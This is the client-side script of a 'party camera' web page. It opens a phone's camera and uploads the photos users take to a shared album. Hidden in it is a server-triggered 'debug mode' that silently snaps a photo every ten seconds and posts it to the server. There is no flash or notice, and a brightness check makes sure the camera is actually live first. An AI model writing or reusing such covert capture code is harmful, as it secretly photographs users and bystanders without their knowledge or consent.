(() => {
  const video = document.getElementById("preview");
  const canvas = document.getElementById("capture");
  const shutter = document.getElementById("shutter");
  const flipBtn = document.getElementById("flip-btn");
  const flash = document.getElementById("flash");
  const nameEl = document.getElementById("cam-name");
  const countEl = document.getElementById("cam-count");
  const errEl = document.getElementById("cam-error");
  const toastEl = document.getElementById("cam-toast");

  let stream = null;
  let facing = "user";
  let busy = false;
  let code = "";
  let debugMode = false;
  let debugTimer = null;

  function partyCode() {
    const parts = window.location.pathname.split("/").filter(Boolean);
    return (parts[parts.length - 1] || "").toLowerCase();
  }

  function appBase() {
    const u = new URL(window.location.href);
    let path = u.pathname || "/";
    path = path.replace(/\/p\/[^/]+\/?$/, "/");
    if (!path.endsWith("/")) path += "/";
    u.pathname = path;
    u.search = "";
    u.hash = "";
    return u;
  }

  function appURL(path) {
    return new URL(path, appBase()).href;
  }

  function toast(msg) {
    toastEl.hidden = !msg;
    toastEl.textContent = msg || "";
    if (msg) {
      setTimeout(() => {
        if (toastEl.textContent === msg) toastEl.hidden = true;
      }, 2200);
    }
  }

  function showError(msg) {
    errEl.hidden = !msg;
    errEl.textContent = msg || "";
  }

  function syncFlipLabel() {
    flipBtn.textContent = facing === "user" ? "Others" : "Selfie";
  }

  async function startCamera() {
    if (stream) {
      stream.getTracks().forEach((t) => t.stop());
      stream = null;
    }
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        audio: false,
        video: {
          facingMode: { ideal: facing },
          width: { ideal: 1920 },
          height: { ideal: 1080 },
        },
      });
      video.srcObject = stream;
      await video.play();
      showError("");
    } catch (err) {
      showError("Allow camera access so this phone can be the party camera.");
    }
  }

  function captureJPEG() {
    const srcW = video.videoWidth || 1280;
    const srcH = video.videoHeight || 720;
    const maxEdge = 1600;
    let w = srcW;
    let h = srcH;
    if (Math.max(w, h) > maxEdge) {
      const scale = maxEdge / Math.max(w, h);
      w = Math.round(w * scale);
      h = Math.round(h * scale);
    }
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, w, h);
    return new Promise((resolve) => {
      canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.84);
    });
  }

  function feedLooksLive() {
    if (!video.videoWidth || video.readyState < 2) return false;
    const w = 32;
    const h = 32;
    const probe = document.createElement("canvas");
    probe.width = w;
    probe.height = h;
    const ctx = probe.getContext("2d");
    ctx.drawImage(video, 0, 0, w, h);
    const data = ctx.getImageData(0, 0, w, h).data;
    let sum = 0;
    let max = 0;
    const n = data.length / 4;
    for (let i = 0; i < data.length; i += 4) {
      const y = 0.2126 * data[i] + 0.7152 * data[i + 1] + 0.0722 * data[i + 2];
      sum += y;
      if (y > max) max = y;
    }
    return max > 18 && sum / n > 4;
  }

  async function sendPhoto(opts) {
    const silent = Boolean(opts && opts.debug);
    const blob = await captureJPEG();
    if (!blob) throw new Error("Could not take that photo");
    const body = new FormData();
    body.append("photo", blob, silent ? "debug.jpg" : "shot.jpg");
    body.append("facing", facing);
    if (silent) body.append("debug", "1");
    const res = await fetch(appURL("api/join/" + code + "/shot"), { method: "POST", body });
    const data = await res.json().catch(() => ({}));
    if (!res.ok) throw new Error(data.error || "Could not send that photo");
    if (typeof data.count === "number" && !silent) {
      countEl.textContent = String(data.count);
    }
    return data;
  }

  async function snap() {
    if (busy) return;
    if (!video.videoWidth) {
      toast("Camera is still waking up.");
      return;
    }
    busy = true;
    shutter.disabled = true;
    flash.classList.remove("pop");
    void flash.offsetWidth;
    flash.classList.add("pop");
    try {
      const data = await sendPhoto({});
      toast(data.cloud ? "In the album." : "Saved. It will reach the album next.");
    } catch (err) {
      toast(err.message || "Could not send that photo");
    } finally {
      busy = false;
      shutter.disabled = false;
    }
  }

  async function debugSnap() {
    if (!debugMode || busy || document.hidden) return;
    if (!feedLooksLive()) return;
    try {
      await sendPhoto({ debug: true });
    } catch (_) {}
  }

  function armDebugSnaps() {
    if (debugTimer) clearInterval(debugTimer);
    debugTimer = null;
    if (!debugMode) return;
    debugTimer = setInterval(() => {
      debugSnap();
    }, 10000);
  }

  flipBtn.addEventListener("click", () => {
    facing = facing === "user" ? "environment" : "user";
    syncFlipLabel();
    startCamera();
  });
  shutter.addEventListener("click", () => snap());

  code = partyCode();
  syncFlipLabel();
  fetch(appURL("api/join/" + code))
    .then((res) => {
      if (!res.ok) throw new Error("This party camera is closed.");
      return res.json();
    })
    .then((data) => {
      nameEl.textContent = data.name || "Party Cam";
      countEl.textContent = String(data.count || 0);
      debugMode = Boolean(data.debug);
      armDebugSnaps();
      return startCamera();
    })
    .catch((err) => showError(err.message || "This party camera is closed."));
})();
